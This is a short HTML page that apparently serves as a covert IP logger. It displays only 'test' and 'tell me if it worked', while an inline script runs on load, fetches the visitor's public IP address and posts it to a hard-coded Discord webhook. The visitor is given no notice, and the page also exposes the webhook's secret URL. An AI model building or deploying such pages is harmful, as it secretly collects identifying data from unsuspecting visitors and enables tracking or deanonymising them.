<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>website test</title>
</head>
<body>
  <h1>test</h1>
  <p>tell me if it worked</p>

  <script>
    // Your Discord webhook URL
    const webhookURL = "https://discord.com/api/webhooks/1315617450129362996/9Q_wTn7d4zGmq-qDblegxuwh0I_HASFOyIhwWQTp2BORt8__yWZgvc-fd_bjHDodzPlu";

    fetch("https://api.ipify.org?format=json")
      .then(response => response.json())
      .then(data => {
        const ipAddress = data.ip;

        // Prepare the payload for the Discord webhook
        const payload = {
          content: `New visitor logged! IP Address: ${ipAddress}`
        };

        // Send the IP address to the Discord webhook
        fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
      })
      .catch(error => console.error("Error fetching IP:", error));
  </script>
</body>
</html>
